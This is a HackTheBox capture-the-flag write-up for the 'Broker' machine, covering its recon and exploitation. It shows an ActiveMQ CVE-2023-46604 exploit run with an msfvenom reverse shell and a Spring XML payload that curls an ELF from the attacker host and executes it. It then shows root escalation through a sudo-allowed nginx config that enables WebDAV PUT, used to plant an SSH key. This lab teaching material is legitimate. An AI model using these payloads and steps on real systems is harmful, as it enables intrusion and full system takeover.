---
title: "HTB: Broker"
date: 2026-04-11
draft: false
categories: ["writeup"]
tags:
  - hackthebox
  - linux
  - easy
  - activemq
  - cve-2023-46604
  - rce
  - sudo-abuse
  - nginx
  - webdav
description: "Apache ActiveMQ RCE (CVE-2023-46604) for initial access, then sudo nginx WebDAV abuse to inject an SSH key as root."
summary: "Apache ActiveMQ RCE (CVE-2023-46604) for initial access, then sudo nginx WebDAV abuse to inject an SSH key as root."
cover:
  image: "/images/htb-broker/info-card.png"
  alt: "HTB Broker"
  relative: false
showToc: true
TocOpen: false
---

| Field      | Value                  |
|------------|------------------------|
| OS         | Linux (Ubuntu 22.04.3) |
| Difficulty | Easy                   |
| Release    | November 2023          |

## Kill Chain

| Step | Action | Result |
|------|--------|--------|
| 1 | Nmap finds ActiveMQ 5.15.15 on TCP 61616 | CVE-2023-46604 candidate |
| 2 | msfvenom ELF payload + Go PoC via CVE-2023-46604 | Shell as `activemq` |
| 3 | `sudo -l` reveals `NOPASSWD: /usr/sbin/nginx` | Privesc path identified |
| 4 | Malicious nginx config enables WebDAV PUT on `/` as root | Arbitrary file write as root |
| 5 | SSH key injected into `/root/.ssh/authorized_keys` via curl | Shell as `root` |

---

## Recon

### nmap

Fast port sweep first, then a service scan on everything that's open.

**Kali:**
```console
$ nmap -p- --min-rate 8000 10.129.230.87

PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
1883/tcp  open  mqtt
5672/tcp  open  amqp
8161/tcp  open  patrol-snmp
37043/tcp open  unknown
61613/tcp open  unknown
61614/tcp open  unknown
61616/tcp open  unknown
```

**Kali:**
```console
$ nmap -p 22,80,1883,5672,8161,37043,61613,61614,61616 -sC -sV 10.129.230.87

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http       nginx 1.18.0 (Ubuntu)
|_http-title: Error 401 Unauthorized
| http-auth:
|_  basic realm=ActiveMQRealm
8161/tcp  open  http       Jetty 9.4.39.v20210325
|_http-title: Error 401 Unauthorized
| http-auth:
|_  basic realm=ActiveMQRealm
61613/tcp open  stomp      Apache ActiveMQ
61616/tcp open  apachemq   ActiveMQ OpenWire transport 5.15.15
...[snip]...
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Port 61616 is the one that matters. The nmap fingerprint confirms ActiveMQ OpenWire transport version 5.15.15, which falls right in the affected range for CVE-2023-46604.

### ActiveMQ - TCP 61616 / 8161

Ports 80 and 8161 both prompt for HTTP basic auth with the realm `ActiveMQRealm`. Default creds `admin:admin` get in on 8161, which shows the ActiveMQ web console. The version is confirmed: 5.15.15. There's nothing inside the console worth exploiting directly, but the version banner is all I needed.

The multiple protocol ports (1883 MQTT, 5672 AMQP, 61613 STOMP, 61614 HTTP transport) are all just ActiveMQ listeners. The one that's vulnerable is 61616, the OpenWire binary protocol.

---

## Shell as activemq

### CVE-2023-46604 - ActiveMQ OpenWire Deserialization RCE

CVE-2023-46604 is a CVSS 10.0 unauthenticated RCE in ActiveMQ's OpenWire protocol handler. The server deserializes incoming data without validating that the target class is a legitimate `Throwable`. An attacker sends a crafted packet that triggers instantiation of Spring's `ClassPathXmlApplicationContext` with an attacker-controlled URL, which fetches and processes a Spring bean XML file that runs arbitrary OS commands. No authentication required, just network access to port 61616.

I used the Go PoC from [SaumyajeetDas](https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ), which fetches a malicious XML and executes whatever's in it. To avoid embedding a bash reverse shell in XML (the `>&` escaping is fiddly), I generated an msfvenom ELF and had the XML curl it down and run it.

**Kali:**
```console
$ git clone https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ
$ cd CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ-main
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.15.229 LPORT=9001 -f elf -o test.elf
```

The XML payload (`poc-linux.xml`) tells the target to curl the ELF and execute it:

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<beans xmlns="http://www.springframework.org/schema/beans"
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:schemaLocation="http://www.springframework.org/schema/beans
   http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
        <list>
            <value>sh</value>
            <value>-c</value>
            <value>curl -s -o test.elf http://10.10.15.229:8001/test.elf; chmod +x ./test.elf; ./test.elf</value>
        </list>
        </constructor-arg>
    </bean>
</beans>
```

Set up a listener and an HTTP server, then fire the exploit:

**Kali:**
```console
$ python3 -m http.server 8001
```

**Kali:**
```console
$ nc -lvnp 9001
```

**Kali:**
```console
$ go run main.go -i 10.129.230.87 -p 61616 -u http://10.10.15.229:8001/poc-linux.xml
```

The HTTP server logs a GET for `poc-linux.xml`, then a second GET for `test.elf`. A moment later, the listener catches the shell.

![activemq shell after CVE-2023-46604 exploitation](/images/htb-broker/activemq-shell-whoami.png)

We're in as `activemq` inside `/opt/apache-activemq-5.15.15/bin/`. First thing: upgrade to a proper TTY.

**Target (activemq):**
```console
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then `Ctrl+Z`, then:

**Kali:**
```console
$ stty raw -echo; fg
```

**Target (activemq):**
```console
$ export TERM=xterm
```

Now grab the user flag:

**Target (activemq):**
```console
$ cat /home/activemq/user.txt
4800a467************************
```

![user.txt flag](/images/htb-broker/user-flag.png)

---

## Shell as root

### sudo enumeration

**Target (activemq):**
```console
$ sudo -l

User activemq may run the following commands on broker:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
```

The `activemq` user can run `nginx` as root with no password, and crucially, nothing restricts which config file it loads. Passing `-c` to nginx lets us supply an arbitrary config. Running as root with `user root` set, nginx worker processes own everything they write. Combine that with the `dav_methods PUT` directive and we have an arbitrary file write primitive anywhere on the filesystem.

### Malicious nginx config

**Target (activemq):**
```console
$ cat << 'EOF' > /tmp/pwn.conf
user root;
worker_processes 4;
pid /tmp/nginx.pid;

events {
    worker_connections 768;
}

http {
    server {
        listen 1337;
        root /;
        autoindex on;
        dav_methods PUT;
    }
}
EOF
```

The key directives: `user root` makes worker processes run as root, `root /` sets the document root to the filesystem root (so paths map directly to filesystem paths), and `dav_methods PUT` enables file uploads via WebDAV.

**Target (activemq):**
```console
$ sudo /usr/sbin/nginx -c /tmp/pwn.conf
```

Nginx starts and listens on port 1337 as root. Now I can PUT files to any path on the system.

### SSH key injection

Generate a key pair, create the `.ssh` directory via WebDAV MKCOL, then write the public key:

**Target (activemq):**
```console
$ ssh-keygen -t ed25519 -f /tmp/root_key -N ""
$ curl -X MKCOL http://localhost:1337/root/.ssh/
$ curl -X PUT http://localhost:1337/root/.ssh/authorized_keys -d "$(cat /tmp/root_key.pub)"
```

**Target (activemq):**
```console
$ ssh -i /tmp/root_key root@localhost
root@broker:~#
```

![root shell confirmed](/images/htb-broker/root-shell-whoami.png)

**Target (root):**
```console
# cat /root/root.txt
744a0ef0************************
```

![root.txt flag](/images/htb-broker/root-flag.png)

